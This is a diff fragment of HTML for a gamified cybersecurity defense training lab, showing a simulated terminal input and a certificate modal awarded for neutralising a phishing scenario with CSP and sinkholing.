+                        <input type="text" id="terminal-cli-input" class="terminal-input-field" placeholder="Type a command (e.g. 'help', 'policy csp', 'nmap', 'detonate')..." autocomplete="off" spellcheck="false">
+                        <button type="submit" class="btn-terminal-send">Execute ↵</button>
+                    </form>
+
+                    <!-- Certificate Button (Unlocks after 100/100) -->
+                    <button id="btn-view-cert" class="btn-deploy-sandbox" style="display: none; margin-top: 14px; width: 100%; text-align: center; justify-content: center;">
+                        🏆 View &amp; Download Official Defense Certificate
+                    </button>
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    <!-- =======================================================
+         10. DEFENSE CERTIFICATE MODAL
+         ======================================================= -->
+    <div id="defense-cert-modal" class="cert-modal-overlay hidden">
+        <div class="cert-frame">
+            <div class="cert-seal">🛡️</div>
+            <div class="cert-title">Certificate of Cybersecurity Defense</div>
+            <div class="cert-subtitle">Personalized AI Agent for privacy protection in mobile personal apps</div>
+            
+            <p style="font-size: 0.85rem; color: #64748b; margin-bottom: 4px;">THIS IS PROUDLY PRESENTED TO</p>
+            <div class="cert-recipient" id="cert-recipient-name">Gadupudi Yugandhar</div>
+
+            <div class="cert-body" id="cert-body-text">
+                For successfully neutralizing <strong>Threat Case #WA-2026-PHISH (MITRE ATT&amp;CK T1566.002)</strong> in the Virtual Cyber Defense Lab using <strong>Content Security Policy (CSP)</strong> and <strong>Network Sinkholing Countermeasures</strong> with a verified Defense Score of <strong>100 / 100 (Grade: A+ Cyber Defense Specialist)</strong>.
+            </div>
+
+            <div class="cert-footer">
+                <span id="cert-date-string">Date: October 2026</span>
+                <span id="cert-hash-string">Verification Hash: 8f9b2d-101-sha256-verified</span>
+                <span>CyberShield Security Lab</span>
+            </div>
+
+            <div style="display: flex; gap: 12px; justify-content: center; margin-top: 20px;">
+                <button type="button" class="btn-player" onclick="window.print()" style="background: #10b981; color: #fff; padding: 10px 20px;">
+                    🖨️ Print / Save PDF
+                </button>
+                <button id="btn-close-cert" class="btn-player" style="background: #0284c7; color: #fff; padding: 10px 24px;">
+                    ✓ Close Certificate
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="/static/js/app.js"></script>
+    <script src="desktop_ui/static/js/app.js"></script>
+</body>
+</html>
